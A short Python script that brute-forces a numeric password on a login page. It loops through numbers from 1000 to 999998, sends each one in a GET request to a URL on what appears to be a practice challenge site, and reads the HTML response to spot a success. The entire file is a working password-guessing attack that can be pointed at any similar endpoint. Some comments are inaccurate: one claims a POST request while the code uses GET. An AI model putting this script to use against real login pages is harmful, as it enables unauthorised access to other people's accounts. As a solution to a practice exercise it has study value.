# (c) Aviparshan 2022 cs.aviparshan.com
import requests 

#given a url and param (password), this function sends a post request
def send_request(url, password): 
    url += password #add the password paramater to the get request
    r = requests.get(url)
    return r.text, r.status_code #returns both the http status code and the html page

#goes through the html page and tries to find either of these strings
def parse_html(html):
    if "Try again." in html or "Wrong pass." in html:  
        return False
    else:
        return True

def brute_force(url):
    for i in range(1000, 999999): #range of all 4 to 6 digit numbers
        text, code = send_request(url, str(i))
        if code != 200: #break out of error before parsing 
            print("Error: " + str(code))
            break #if not 200, then issue with the request
        elif parse_html(text): #if the html page contains the string "Wrong pass." or "Try again.", then the password is incorrect
            print("Password is: " + str(i))
            break #break out of loop once password is found
        else: #general error
            print("Trying: " + str(i))
            pass #if the password is incorrect, then try the next number

def main():
    url = "http://www.zixem.altervista.org/SQLi/login_do.php?pass="     #main URL
    brute_force(url)

if __name__ == "__main__":
    main()